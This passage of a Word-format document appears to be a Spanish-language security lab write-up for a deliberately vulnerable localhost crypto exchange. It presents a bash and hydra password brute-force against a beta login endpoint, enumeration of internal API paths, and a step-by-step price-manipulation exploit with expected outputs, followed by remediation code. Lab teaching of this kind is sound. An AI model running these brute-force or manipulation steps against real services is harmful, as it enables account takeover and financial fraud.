        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#!/bin/bash</w:t>
        <w:br/>
        <w:t># brute_force_v2.sh - Fuerza bruta contra el endpoint beta sin rate limit</w:t>
        <w:br/>
        <w:br/>
        <w:t>TARGET="http://localhost/appsec/api/v2/auth/login.php"</w:t>
        <w:br/>
        <w:t>EMAIL="admin@cryptovulnx.com"</w:t>
        <w:br/>
        <w:t>WORDLIST="/usr/share/wordlists/rockyou.txt"</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "[*] Iniciando fuerza bruta contra v2 beta (sin rate limit)..."</w:t>
        <w:br/>
        <w:t>echo "[*] Objetivo: $EMAIL"</w:t>
        <w:br/>
        <w:br/>
        <w:t>while IFS= read -r PASSWORD; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    RESP=$(curl -s -X POST "$TARGET" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    STATUS=$(echo "$RESP" | python -c "import sys,json; print(json.load(sys.stdin).get('status',''))" 2&gt;/dev/null)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if [ "$STATUS" = "success" ]; then</w:t>
        <w:br/>
        <w:t xml:space="preserve">        TOKEN=$(echo "$RESP" | python -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2&gt;/dev/null)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo "[+] PASSWORD ENCONTRADA: $PASSWORD"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo "[+] Token JWT: $TOKEN"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break</w:t>
        <w:br/>
        <w:t xml:space="preserve">    fi</w:t>
        <w:br/>
        <w:t>done &lt; "$WORDLIST"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Tambien se puede usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>hydra</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hydra -l admin@cryptovulnx.com -P /usr/share/wordlists/rockyou.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  localhost http-post-form \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "/appsec/api/v2/auth/login.php:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Credenciales invalidas" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -t 50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 2: Acceso al Servicio Interno de Cotizaciones</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Descubrir el endpoint interno.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Enumerar rutas internas</w:t>
        <w:br/>
        <w:t>for ENDPOINT in rates users admin config health status; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      http://localhost/appsec/api/internal/$ENDPOINT.php)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "api/internal/$ENDPOINT.php -&gt; HTTP $STATUS"</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Resultado esperado:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>api/internal/rates.php -&gt; HTTP 200</w:t>
        <w:br/>
        <w:t>api/internal/users.php -&gt; HTTP 404</w:t>
        <w:br/>
        <w:t>api/internal/admin.php -&gt; HTTP 404</w:t>
        <w:br/>
        <w:t>api/internal/config.php -&gt; HTTP 404</w:t>
        <w:br/>
        <w:t>api/internal/health.php -&gt; HTTP 404</w:t>
        <w:br/>
        <w:t>api/internal/status.php -&gt; HTTP 404</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Acceder al endpoint interno de cotizaciones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost/appsec/api/internal/rates.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "67542.50",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "ETH": "3521.80",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "SOL": "142.30",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "ADA": "0.65",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "XRP": "0.58",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "USDT": "1.00"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "last_updated": "2026-03-28T14:25:00Z",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "source": "internal_feed",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "server_info": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "hostname": "ip-10-0-1-25.ec2.internal",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "db_host": "10.0.1.50",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "db_name": "cryptovulnx_db",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "cache_ttl": 60,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "api_version": "internal-1.0"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>server_info</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> revela el hostname interno del servidor (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ip-10-0-1-25.ec2.internal</w:t>
      </w:r>
      <w:r>
        <w:t>), la direccion IP de la base de datos (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>10.0.1.50</w:t>
      </w:r>
      <w:r>
        <w:t>) y el nombre de la base de datos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 3: Manipulacion de Precios para Obtener Ganancias</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Autenticarse con una cuenta normal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TOKEN=$(curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"attacker@test.com","password":"password123"}' | \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  python -c "import sys,json; print(json.load(sys.stdin)['token'])")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Verificar el saldo actual.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost/appsec/api/v1/wallet/balance.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "balances": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "USDT": "10000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "0.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "ETH": "0.00"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Manipular el precio de BTC a un valor irrisorio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/internal/rates.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"rates":{"BTC":"1.00"}}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Precios actualizados",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "updated_rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "1.00"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "previous_rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "67542.50"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 4</w:t>
      </w:r>
      <w:r>
        <w:t>: Comprar BTC al precio manipulado (1 USDT = 1 BTC).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"USDT","to":"BTC","amount":10000}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "swap": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "from": "USDT",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "to": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount_sent": "10000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount_received": "10000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "rate": "1.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "fee": "0.00"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ahora tenemos 10,000 BTC (que normalmente valdrian $675,425,000 USD).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 5</w:t>
      </w:r>
      <w:r>
        <w:t>: Restaurar el precio original de BTC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/internal/rates.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"rates":{"BTC":"67542.50"}}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 6</w:t>
      </w:r>
      <w:r>
        <w:t>: Vender BTC al precio real para obtener ganancias masivas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"BTC","to":"USDT","amount":10000}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "swap": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "from": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "to": "USDT",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount_sent": "10000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount_received": "675425000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "rate": "67542.50",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "fee": "0.00"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Resultado</w:t>
      </w:r>
      <w:r>
        <w:t>: Inversion de 10,000 USDT convertida en 675,425,000 USDT mediante manipulacion de precios.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 7</w:t>
      </w:r>
      <w:r>
        <w:t>: Verificar saldo final.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost/appsec/api/v1/wallet/balance.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "balances": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "USDT": "675425000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "0.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "ETH": "0.00"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Inventario Completo de APIs y Descomision de Versiones Beta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// api/v2/auth/login.php - ELIMINAR o redirigir a v1</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Opcion A: Eliminar el archivo completamente</w:t>
        <w:br/>
        <w:t>// rm -rf api/v2/</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Opcion B: Redirigir a la version estable</w:t>
        <w:br/>
        <w:t>http_response_code(301);</w:t>
        <w:br/>
        <w:t>header("Location: /appsec/api/v1/auth/login.php");</w:t>
        <w:br/>
        <w:t>echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "status" =&gt; "error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "message" =&gt; "Esta version de la API ha sido deprecada. Use /api/v1/"</w:t>
        <w:br/>
        <w:t>]);</w:t>
        <w:br/>
        <w:t>exit;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Proteger Endpoints Internos con Reglas de Red</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[apache]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># .htaccess - Bloquear acceso externo a endpoints internos</w:t>
        <w:br/>
        <w:br/>
        <w:t>&lt;LocationMatch "^/appsec/api/internal/"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Solo permitir acceso desde IPs internas</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Require ip 10.0.0.0/8</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Require ip 172.16.0.0/12</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Require ip 192.168.0.0/16</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Require ip 127.0.0.1</w:t>
        <w:br/>
        <w:t>&lt;/LocationMatch&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Alternativamente, validar en el propio PHP:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// api/internal/rates.php - Proteccion por IP y autenticacion</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Verificar que la solicitud proviene de la red interna</w:t>
        <w:br/>
        <w:t>$allowed_networks = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.1'];</w:t>
        <w:br/>
        <w:t>$client_ip = $_SERVER['REMOTE_ADDR'];</w:t>
        <w:br/>
        <w:t>$is_internal = false;</w:t>
        <w:br/>
        <w:br/>
        <w:t>foreach ($allowed_networks as $network) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (ipInRange($client_ip, $network)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $is_internal = true;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!$is_internal) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(403);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Acceso denegado"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Ademas, requerir un token de servicio interno</w:t>
        <w:br/>
        <w:t>$service_token = $_SERVER['HTTP_X_SERVICE_TOKEN'] ?? '';</w:t>
        <w:br/>
        <w:t>$valid_token = getenv('INTERNAL_SERVICE_TOKEN');</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!hash_equals($valid_token, $service_token)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(401);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode(["error" =&gt; "Token de servicio invalido"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
